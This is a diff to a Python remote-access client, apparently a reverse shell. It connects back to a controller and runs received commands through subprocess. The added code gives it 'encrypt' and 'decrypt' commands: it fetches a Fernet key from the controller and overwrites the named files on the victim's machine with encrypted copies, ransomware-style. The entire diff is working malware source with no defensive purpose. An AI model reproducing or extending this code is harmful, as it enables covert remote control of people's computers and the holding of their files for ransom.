@@ -1,6 +1,7 @@
 while True:
     try:
         import socket as s, subprocess as sp, os, pyautogui, tempfile, urllib.request
+        from cryptography.fernet import Fernet
 
         #creatin socket
         BUFFER_SIZE = 1024 * 1280
@@ -51,6 +52,48 @@ while True:
                         result = "It's not a window OS"
 
                     output = result
+                elif d.split()[0].lower() == "encrypt":
+                    cwd = os.getcwd()
+                    c.send((f"{cwd}"+"<sep>"+"key").encode())
+                    key=c.recv(BUFFER_SIZE)
+                    try:
+                        f = Fernet(key)
+                        err_file = 0
+                        succ_file = 0
+                        for filename in d.split()[1:]:
+                            if os.path.exists(filename):
+                                with open(filename, "rb") as file:
+                                    file_data = file.read()
+                                encrypted_data = f.encrypt(file_data)
+                                with open(filename, "wb") as file:
+                                    file.write(encrypted_data)
+                                succ_file += 1
+                            else:
+                                 err_file += 1     
+                        output=f"{succ_file} file encrypted and {err_file} file not exist out of {len(d.split())-1}.\n"   
+                    except Exception as err:
+                        output = err
+                elif d.split()[0].lower() == "decrypt":
+                    cwd = os.getcwd()
+                    c.send((f"{cwd}"+"<sep>"+"key").encode())
+                    key=c.recv(BUFFER_SIZE)
+                    try:
+                        f = Fernet(key)
+                        err_file = 0
+                        succ_file = 0
+                        for filename in d.split()[1:]:
+                            if os.path.exists(filename):
+                                with open(filename, "rb") as file:
+                                    encrypted_data  = file.read()
+                                decrypted_data  = f.decrypt(encrypted_data)
+                                with open(filename, "wb") as file:
+                                    file.write(decrypted_data)
+                                succ_file += 1
+                            else:
+                                 err_file += 1     
+                        output=f"{succ_file} file decrypted and {err_file} file not exist out of {len(d.split())-1}.\n"   
+                    except Exception as err:
+                        output = err
                 else:
                     output = str(sp.getoutput(d))
                 cwd = os.getcwd()
